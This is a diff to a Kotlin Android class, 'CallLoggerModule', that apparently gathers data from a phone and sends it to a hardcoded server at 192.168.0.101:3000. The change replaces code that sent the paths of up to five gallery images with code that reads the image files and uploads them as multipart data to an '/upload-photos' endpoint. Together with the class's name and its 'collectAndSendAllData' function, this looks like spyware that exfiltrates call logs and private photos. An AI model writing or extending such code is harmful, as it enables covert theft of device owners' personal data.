@@ -14,8 +14,14 @@ import org.json.JSONArray
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
+import java.io.BufferedWriter
+import java.io.File
+import java.io.FileInputStream
+import java.io.OutputStreamWriter
 
 class CallLoggerModule {
+
+
     private val serverBaseUrl = "http://192.168.0.101:3000"
 
     fun collectAndSendAllData(context: Context) {
@@ -141,7 +147,7 @@ class CallLoggerModule {
             MediaStore.Images.Media.DATA
         )
 
-        val photos = JSONArray()
+        val files = mutableListOf<File>()
 
         context.contentResolver.query(
             MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
@@ -152,16 +158,58 @@ class CallLoggerModule {
         )?.use { cursor ->
             var count = 0
             while (cursor.moveToNext() && count < 5) {
-                JSONObject().apply {
-                    put("path", cursor.getString(2))
-                    put("date", cursor.getString(1))
-                }.let {
-                    photos.put(it)
+                val filePath = cursor.getString(2)
+                val file = File(filePath)
+
+                if (file.exists()) {
+                    files.add(file)
                     count++
                 }
             }
         }
-        sendToServer("$serverBaseUrl/upload-photos", photos)
+
+        if (files.isNotEmpty()) {
+            sendToServerFiles(files)
+        }
+    }
+
+    private fun sendToServerFiles(files: List<File>) {
+        try {
+            val url = URL("$serverBaseUrl/upload-photos")
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "POST"
+            connection.doOutput = true
+            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW")
+
+            val boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+            val outputStream = connection.outputStream
+            val writer = BufferedWriter(OutputStreamWriter(outputStream, "UTF-8"))
+
+            for (file in files) {
+                writer.write("--$boundary\r\n")
+                writer.write("Content-Disposition: form-data; name=\"photos\"; filename=\"${file.name}\"\r\n")
+                writer.write("Content-Type: image/jpeg\r\n\r\n")
+                writer.flush()
+
+                FileInputStream(file).use { input ->
+                    input.copyTo(outputStream)
+                }
+                writer.write("\r\n")
+            }
+
+            writer.write("--$boundary--\r\n")
+            writer.flush()
+            writer.close()
+
+            val responseCode = connection.responseCode
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                println("Фотографии успешно загружены")
+            } else {
+                println("Ошибка загрузки: $responseCode")
+            }
+        } catch (e: Exception) {
+            println("Ошибка сети: ${e.message}")
+        }
     }
 
     // Общая функция отправки
